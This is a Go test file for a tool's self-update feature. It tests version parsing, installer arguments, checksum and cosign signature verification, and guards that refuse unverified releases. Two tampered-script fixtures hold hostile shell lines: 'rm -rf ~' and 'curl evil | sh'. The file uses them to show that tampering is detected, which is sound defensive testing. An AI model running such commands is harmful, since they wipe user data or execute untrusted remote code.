// Tests for `self-update`: the pure parts (version discovery, the installer
// argv, the reports) and the whole flow through Run with a fake Env. No network
// is touched and nothing is installed.
package selfupdate

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"path/filepath"
	"reflect"
	"regexp"
	"strings"
	"testing"
)

func TestResolveRepo_EnvOverridesTheDefault(t *testing.T) {
	if got := ResolveRepo(""); got != "rigsmith/rigsmith" {
		t.Fatalf("default repo = %q, want rigsmith/rigsmith (matching scripts/install.sh)", got)
	}
	if got := ResolveRepo("  "); got != "rigsmith/rigsmith" {
		t.Fatalf("blank env = %q, want the default", got)
	}
	if got := ResolveRepo("acme/fork"); got != "acme/fork" {
		t.Fatalf("env override = %q, want acme/fork", got)
	}
}

func TestLatestReleaseURL(t *testing.T) {
	want := "https://api.github.com/repos/rigsmith/rigsmith/releases/latest"
	if got := LatestReleaseURL("rigsmith/rigsmith"); got != want {
		t.Fatalf("LatestReleaseURL = %q, want %q", got, want)
	}
}

func TestParseReleaseTag(t *testing.T) {
	if got := ParseReleaseTag([]byte(`{"tag_name":"v1.4.0","name":"v1.4.0"}`)); got != "v1.4.0" {
		t.Fatalf("tag = %q, want v1.4.0", got)
	}
	if got := ParseReleaseTag([]byte(`{"message":"Not Found"}`)); got != "" {
		t.Fatalf("missing tag = %q, want empty", got)
	}
	if got := ParseReleaseTag([]byte("not json")); got != "" {
		t.Fatalf("malformed = %q, want empty", got)
	}
}

func TestFamilyFor_DropsBrewrigOnWindowsOnly(t *testing.T) {
	if got := FamilyFor("darwin"); !reflect.DeepEqual(got, Family) {
		t.Fatalf("darwin family = %v, want %v", got, Family)
	}
	for _, tool := range FamilyFor("windows") {
		if tool == "brewrig" {
			t.Fatal("brewrig in the windows family; install.sh skips it there")
		}
	}
	if len(FamilyFor("windows")) != len(Family)-1 {
		t.Fatalf("windows family = %v", FamilyFor("windows"))
	}
}

func TestParseVersionOutput(t *testing.T) {
	for _, tt := range []struct{ in, want string }{
		{"1.27.0\n", "1.27.0"},
		{"v1.28.0", "1.28.0"},
		{"v1.23.1 (abc1234)\n", "1.23.1"},
		{"1.29.0-rc.1", "1.29.0-rc.1"},
		// fang's description of a source build, which carries a date but no version.
		{"source build · 2026-06-17 14:30 · /Users/you/src/rigsmith · a1b2c3d", ""},
		{"2026-11-01", ""},
		{"", ""},
	} {
		if got := ParseVersionOutput(tt.in); got != tt.want {
			t.Errorf("ParseVersionOutput(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// fakeBin is a bin directory as probeVersion would see it: path → --version
// output, absent paths not installed. dir is compared cleaned, so a slash path
// still matches on Windows, where filepath turns it into backslashes.
func fakeBin(dir string, versions map[string]string) func(string) (string, bool) {
	return func(path string) (string, bool) {
		if filepath.Dir(path) != filepath.Clean(dir) {
			return "", false
		}
		v, ok := versions[filepath.Base(path)]
		return v, ok
	}
}

func TestDiscover_ProbesTheBinDirAndTrustsTheRunningToolsStamp(t *testing.T) {
	probe := fakeBin("/home/you/.local/bin", map[string]string{
		"rig":     "9.9.9\n", // must not be probed: rig is the running tool
		"shiprig": "1.23.1\n",
		"brewrig": "dev (source build)",
	})
	got := Discover("/home/you/.local/bin", []string{"rig", "shiprig", "changerig", "brewrig"}, "rig", "v1.27.0", probe)
	want := []Installed{
		{Tool: "rig", Present: true, Version: "1.27.0"},
		{Tool: "shiprig", Present: true, Version: "1.23.1"},
		{Tool: "changerig", Present: false},
		{Tool: "brewrig", Present: true, Version: ""},
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("Discover =\n %+v\nwant\n %+v", got, want)
	}
}

func TestNeedsUpdate_AnyInstalledToolOffTheTag(t *testing.T) {
	current := []Installed{{Tool: "rig", Present: true, Version: "1.28.0"}, {Tool: "codexrig"}}
	if NeedsUpdate(current, "v1.28.0") {
		t.Fatal("all installed tools at the tag; a missing tool alone must not trigger a run")
	}
	// rig already at the tag doesn't hide shiprig behind it.
	mixed := append(current, Installed{Tool: "shiprig", Present: true, Version: "1.23.1"})
	if !NeedsUpdate(mixed, "v1.28.0") {
		t.Fatal("shiprig is behind; the family must be re-pinned")
	}
	unknown := []Installed{{Tool: "brewrig", Present: true, Version: ""}}
	if !NeedsUpdate(unknown, "1.28.0") {
		t.Fatal("an unreadable version can't be confirmed on the tag; re-pin it")
	}
}

func TestInstallerArgs_RunsTheStagedScriptForTheFamilyPinnedToTheTag(t *testing.T) {
	// Native paths: binDir comes from os.Executable, and its prefix from filepath.Dir.
	binDir := filepath.FromSlash("/home/you/.local/bin")
	got := InstallerArgs("rigsmith/rigsmith", "v1.28.0", binDir, "/tmp/x/install.sh")
	want := []string{
		"env", "RIGSMITH_VERSION=v1.28.0", "RIGSMITH_REPO=rigsmith/rigsmith",
		"RIGSMITH_BIN_DIR=" + binDir, "RIGSMITH_INSTALL=" + filepath.Dir(binDir),
		"sh", "/tmp/x/install.sh", "all",
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("argv =\n %q\nwant\n %q", got, want)
	}
}

func TestInstallerArgs_PassesTheDirVerbatimAndSkipsThePrefixOffABin(t *testing.T) {
	argv := InstallerArgs("acme/fork", "v2.0.0", "/opt/you's tools", "/tmp/install.sh")
	joined := strings.Join(argv, "|")
	// env(1) takes NAME=value as one argument: nothing to quote, nothing to inject.
	if !strings.Contains(joined, "|RIGSMITH_BIN_DIR=/opt/you's tools|") {
		t.Fatalf("bin dir not passed as one argument: %q", argv)
	}
	if strings.Contains(joined, "RIGSMITH_INSTALL=") {
		t.Fatalf("a dir not named bin has no prefix to give an older installer: %q", argv)
	}
	if !strings.Contains(joined, "|RIGSMITH_REPO=acme/fork|") {
		t.Fatalf("fork repo not carried through: %q", argv)
	}
}

func TestManagedUpgrade_NamesTheManagersOwnPackage(t *testing.T) {
	for path, want := range map[string]string{
		// The bundle cask, and a per-tool cask: brew upgrades only the token named.
		"/opt/homebrew/Caskroom/rigsmith/1.18.0/rig":                     "brew upgrade --cask rigsmith",
		"/opt/homebrew/Caskroom/rig/1.18.0/rig":                          "brew upgrade --cask rig",
		"/usr/local/Cellar/rigsmith/1.18.0/bin/rig":                      "brew upgrade rigsmith",
		"/usr/local/lib/node_modules/@rigsmith/rig-darwin-arm64/bin/rig": "npm install -g @rigsmith/rig@latest",
		"/home/you/.local/bin/rig":                                       "",
		"":                                                               "",
	} {
		if got, _, _ := ManagedUpgrade("rig", path); got != want {
			t.Errorf("ManagedUpgrade(%q) = %q, want %q", path, got, want)
		}
	}
}

func TestCheckLines(t *testing.T) {
	got := CheckLines([]Installed{
		{Tool: "rig", Present: true, Version: "1.28.0"},
		{Tool: "shiprig", Present: true, Version: "1.23.1"},
		{Tool: "brewrig"},
		{Tool: "codexrig", Present: true},
	}, "v1.28.0")
	want := []string{
		"rig       v1.28.0 (current)",
		"shiprig   v1.23.1 → v1.28.0",
		"brewrig   not installed",
		"codexrig  unknown version → v1.28.0",
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("CheckLines =\n %q\nwant\n %q", got, want)
	}
}

func TestMoveLines(t *testing.T) {
	before := []Installed{
		{Tool: "rig", Present: true, Version: "1.28.0"},
		{Tool: "shiprig", Present: true, Version: "1.23.1"},
		{Tool: "codexrig"},
	}
	after := []Installed{
		{Tool: "rig", Present: true, Version: "1.28.0"},
		{Tool: "shiprig", Present: true, Version: "1.28.0"},
		{Tool: "codexrig", Present: true, Version: "1.28.0"},
		{Tool: "brewrig"},
	}
	want := []string{
		"rig       v1.28.0 (unchanged)",
		"shiprig   v1.23.1 → v1.28.0",
		"codexrig  installed v1.28.0",
		"brewrig   not installed",
	}
	if got := MoveLines(before, after); !reflect.DeepEqual(got, want) {
		t.Fatalf("MoveLines =\n %q\nwant\n %q", got, want)
	}
}

// testScript is the release's install.sh in testEnv, and testSums its
// checksums file.
var testScript = []byte("#!/bin/sh\necho installing\n")

func testSums() []byte {
	return []byte(sha256Hex(testScript) + "  install.sh\n" + strings.Repeat("0", 64) + "  rig_1.28.0_darwin_arm64.tar.gz\n")
}

// testEnv is shiprig run from /home/you/.local/bin with the rest of the family
// behind it, a release whose checksums are signed and whose installer matches
// them, and an installer that moves everything to the tag.
func testEnv(installed map[string]string, tag string) (*Env, *[][]string) {
	dir := "/home/you/.local/bin"
	var calls [][]string
	assets := map[string][]byte{
		ChecksumsAsset: testSums(),
		SignatureAsset: []byte(`{"bundle":"ok"}`),
		InstallerAsset: testScript,
	}
	e := &Env{
		Tool: "shiprig", Version: "1.23.1", GOOS: "darwin", Repo: "rigsmith/rigsmith",
		Exe: dir + "/shiprig", Resolved: dir + "/shiprig",
		FetchLatestTag: func() (string, error) { return tag, nil },
		ProbeVersion:   fakeBin(dir, installed),
		Fetch: func(url string) ([]byte, error) {
			name := url[strings.LastIndex(url, "/")+1:]
			if want := ReleaseAssetURL("rigsmith/rigsmith", tag, name); url != want {
				return nil, errors.New("unexpected URL " + url)
			}
			if b, ok := assets[name]; ok {
				return b, nil
			}
			return nil, ErrNotFound
		},
		VerifySignature: func(_, bundle []byte) (bool, error) {
			if string(bundle) != `{"bundle":"ok"}` {
				return false, errors.New("signature mismatch")
			}
			return true, nil
		},
		StageScript: func(script []byte) (string, func(), error) {
			if string(script) != string(testScript) {
				return "", nil, errors.New("staged a script that was not the verified one")
			}
			return "/tmp/staged/install.sh", func() {}, nil
		},
	}
	assetsOf[e] = assets
	e.Install = func(argv []string) error {
		calls = append(calls, argv)
		for _, t := range Family {
			installed[t] = strings.TrimPrefix(tag, "v") + "\n"
		}
		return nil
	}
	return e, &calls
}

func TestRun_UpdatesTheWholeFamilyAndReportsWhatMoved(t *testing.T) {
	installed := map[string]string{"rig": "1.27.0", "shiprig": "1.23.1", "changerig": "1.23.1"}
	e, calls := testEnv(installed, "v1.28.0")
	var out bytes.Buffer
	if err := Run(&out, false, *e); err != nil {
		t.Fatal(err)
	}
	if len(*calls) != 1 {
		t.Fatalf("installer ran %d times, want once for the family", len(*calls))
	}
	if want := InstallerArgs("rigsmith/rigsmith", "v1.28.0", filepath.Dir(e.Exe), "/tmp/staged/install.sh"); !reflect.DeepEqual((*calls)[0], want) {
		t.Fatalf("installer argv = %v, want %v", (*calls)[0], want)
	}
	for _, want := range []string{"rig        v1.27.0 → v1.28.0", "shiprig    v1.23.1 → v1.28.0", "codexrig   installed v1.28.0"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("report missing %q:\n%s", want, out.String())
		}
	}
}

func TestRun_RepinsWhenTheRunningToolIsCurrentButASiblingIsNot(t *testing.T) {
	installed := map[string]string{"rig": "1.23.1"}
	e, calls := testEnv(installed, "v1.28.0")
	e.Version = "1.28.0"
	if err := Run(&bytes.Buffer{}, false, *e); err != nil {
		t.Fatal(err)
	}
	if len(*calls) != 1 {
		t.Fatal("shiprig is current but rig is not; the family must still be re-pinned")
	}
}

func TestRun_UpToDateInstallsNothing(t *testing.T) {
	e, calls := testEnv(map[string]string{"rig": "1.28.0"}, "v1.28.0")
	e.Version = "1.28.0"
	var out bytes.Buffer
	if err := Run(&out, false, *e); err != nil {
		t.Fatal(err)
	}
	if len(*calls) != 0 || !strings.Contains(out.String(), "up to date") {
		t.Fatalf("calls=%d out=%s", len(*calls), out.String())
	}
}

func TestRun_CheckReportsTheFamilyAndInstallsNothing(t *testing.T) {
	e, calls := testEnv(map[string]string{"rig": "1.27.0"}, "v1.28.0")
	var out bytes.Buffer
	if err := Run(&out, true, *e); err != nil {
		t.Fatal(err)
	}
	if len(*calls) != 0 {
		t.Fatal("--check installed something")
	}
	for _, want := range []string{"latest release: v1.28.0", "rig        v1.27.0 → v1.28.0", "brewrig    not installed", "run `shiprig self-update`"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("--check missing %q:\n%s", want, out.String())
		}
	}
}

func TestRun_KeepsTheGuards(t *testing.T) {
	cases := map[string]struct {
		mutate func(*Env)
		want   string
	}{
		"dev build": {func(e *Env) { e.Version = "dev" }, "dev build"},
		"offline": {func(e *Env) {
			e.FetchLatestTag = func() (string, error) { return "", errors.New("dial tcp: no route") }
		}, "couldn't reach GitHub"},
		"no releases": {func(e *Env) { e.FetchLatestTag = func() (string, error) { return "", nil } }, "no published releases"},
		"windows":     {func(e *Env) { e.GOOS = "windows" }, "can't replace a running shiprig.exe"},
		"homebrew":    {func(e *Env) { e.Resolved = "/opt/homebrew/Caskroom/rigsmith/1.18.0/shiprig" }, "brew upgrade --cask rigsmith"},
		"npm": {func(e *Env) {
			e.Resolved = "/usr/local/lib/node_modules/@rigsmith/shiprig-darwin-arm64/bin/shiprig"
		}, "npm install -g @rigsmith/shiprig@latest"},
		"newer than latest": {func(e *Env) { e.Version = "1.29.0-rc.1" }, "newer than the latest release"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			e, calls := testEnv(map[string]string{"rig": "1.23.1"}, "v1.28.0")
			tc.mutate(e)
			var out bytes.Buffer
			if err := Run(&out, false, *e); err != nil {
				t.Fatalf("a guard is not a failure: %v", err)
			}
			if len(*calls) != 0 {
				t.Fatal("installer ran past a guard")
			}
			if !strings.Contains(out.String(), tc.want) {
				t.Fatalf("output missing %q:\n%s", tc.want, out.String())
			}
		})
	}
}

// assetsOf lets a test reach testEnv's release assets to tamper with them.
var assetsOf = map[*Env]map[string][]byte{}

func sha256Hex(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

func TestVerifyChecksum(t *testing.T) {
	sums := testSums()
	if err := VerifyChecksum(sums, "install.sh", testScript); err != nil {
		t.Fatalf("a matching script failed: %v", err)
	}
	if err := VerifyChecksum(sums, "install.sh", []byte("#!/bin/sh\nrm -rf ~\n")); err == nil || !strings.Contains(err.Error(), "does not match") {
		t.Fatalf("a tampered script passed: %v", err)
	}
	if err := VerifyChecksum(sums, "shiprig_1.28.0_darwin_arm64.tar.gz", nil); err == nil || !strings.Contains(err.Error(), "not listed") {
		t.Fatalf("an unlisted file passed: %v", err)
	}
	// sha256sum's binary-mode marker.
	if err := VerifyChecksum([]byte(sha256Hex(testScript)+" *install.sh\n"), "install.sh", testScript); err != nil {
		t.Fatalf("binary-mode line not read: %v", err)
	}
}

// Nothing is installed unless the checksums carry a valid signature and the
// installer matches them.
func TestRun_RefusesAnUnverifiedRelease(t *testing.T) {
	cases := map[string]struct {
		mutate func(*Env)
		want   string
	}{
		"tampered script": {func(e *Env) {
			assetsOf[e][InstallerAsset] = []byte("#!/bin/sh\ncurl evil | sh\n")
		}, "install.sh does not match checksums.txt"},
		"missing signature": {func(e *Env) {
			delete(assetsOf[e], SignatureAsset)
		}, "has no signature"},
		"invalid signature": {func(e *Env) {
			assetsOf[e][SignatureAsset] = []byte(`{"bundle":"forged"}`)
		}, "does not verify"},
		"missing checksums": {func(e *Env) {
			delete(assetsOf[e], ChecksumsAsset)
		}, "couldn't download checksums.txt"},
		"no cosign, signature required": {func(e *Env) {
			e.VerifySignature = func(_, _ []byte) (bool, error) { return false, nil }
			e.RequireSignature = true
		}, "requires it"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			e, calls := testEnv(map[string]string{"rig": "1.23.1"}, "v1.28.0")
			tc.mutate(e)
			err := Run(&bytes.Buffer{}, false, *e)
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("err = %v, want one containing %q", err, tc.want)
			}
			if len(*calls) != 0 {
				t.Fatal("the installer ran on an unverified release")
			}
		})
	}
}

func TestRun_WithoutCosignChecksTheChecksumsAndSaysSo(t *testing.T) {
	e, calls := testEnv(map[string]string{"rig": "1.23.1"}, "v1.28.0")
	e.VerifySignature = func(_, _ []byte) (bool, error) { return false, nil }
	var out bytes.Buffer
	if err := Run(&out, false, *e); err != nil {
		t.Fatal(err)
	}
	if len(*calls) != 1 {
		t.Fatal("the installer should still run on verified checksums")
	}
	if !strings.Contains(out.String(), "cosign isn't installed") || !strings.Contains(out.String(), RequireSignatureEnv) {
		t.Fatalf("the fallback isn't said plainly:\n%s", out.String())
	}
}

func TestSigningIdentity_PinsTheReleaseWorkflowOfTheRepo(t *testing.T) {
	re := regexp.MustCompile(SigningIdentity("rigsmith/rigsmith"))
	for id, want := range map[string]bool{
		"https://github.com/rigsmith/rigsmith/.github/workflows/release.yml@refs/tags/v1.29.0": true,
		"https://github.com/rigsmith/rigsmith/.github/workflows/release.yml@refs/heads/main":   true,
		"https://github.com/rigsmith/rigsmith/.github/workflows/ci.yml@refs/heads/main":        false,
		"https://github.com/acme/rigsmith/.github/workflows/release.yml@refs/tags/v1.29.0":     false,
	} {
		if got := re.MatchString(id); got != want {
			t.Errorf("identity %s matched = %v, want %v", id, got, want)
		}
	}
}

func TestCosignSupport_RefusesBypassableAndTooOldVersions(t *testing.T) {
	banner := func(v string) string { return "  ______  ____\nGitVersion:    " + v + "\nGitCommit:     abc\n" }
	for _, tc := range []struct {
		out     string
		args    string
		problem string
	}{
		{banner("v3.1.3"), "", ""},
		{banner("v3.2.0"), "", ""},
		{banner("v4.0.0"), "", ""},
		{banner("v3.1.2"), "", "GHSA-fx35-mq7g-6g98"},
		{banner("v3.0.6"), "", "GHSA-fx35-mq7g-6g98"},
		{banner("v2.6.5"), "--new-bundle-format", ""},
		{banner("v2.6.4"), "", "GHSA-fx35-mq7g-6g98"},
		{banner("v1.13.1"), "", "too old"},
		{"cosign: command not understood", "", "couldn't read"},
	} {
		args, problem := CosignSupport(tc.out)
		if strings.Join(args, " ") != tc.args || (tc.problem == "") != (problem == "") || !strings.Contains(problem, tc.problem) {
			t.Errorf("CosignSupport(%q) = %v, %q; want %q, %q", tc.out, args, problem, tc.args, tc.problem)
		}
	}
}

// A cosign that can't be trusted is treated like none: the checksums are
// checked and the reason is said, and RIGSMITH_REQUIRE_SIGNATURE=1 refuses.
func TestRun_AnUnsupportedCosignIsNotTrusted(t *testing.T) {
	unsupported := func(_, _ []byte) (bool, error) {
		return false, &UnsupportedVerifier{Reason: "cosign v3.0.6 has a signature-check bypass (GHSA-fx35-mq7g-6g98); upgrade to v3.1.3 or later"}
	}
	e, calls := testEnv(map[string]string{"rig": "1.23.1"}, "v1.28.0")
	e.VerifySignature = unsupported
	var out bytes.Buffer
	if err := Run(&out, false, *e); err != nil || len(*calls) != 1 {
		t.Fatalf("err=%v calls=%d", err, len(*calls))
	}
	if !strings.Contains(out.String(), "GHSA-fx35-mq7g-6g98") || strings.Contains(out.String(), "verified the signature") {
		t.Fatalf("an untrusted cosign wasn't reported as such:\n%s", out.String())
	}

	strict, strictCalls := testEnv(map[string]string{"rig": "1.23.1"}, "v1.28.0")
	strict.VerifySignature = unsupported
	strict.RequireSignature = true
	if err := Run(&bytes.Buffer{}, false, *strict); err == nil || !strings.Contains(err.Error(), "GHSA-fx35-mq7g-6g98") || len(*strictCalls) != 0 {
		t.Fatalf("RIGSMITH_REQUIRE_SIGNATURE=1 accepted an untrusted cosign: %v", err)
	}
}
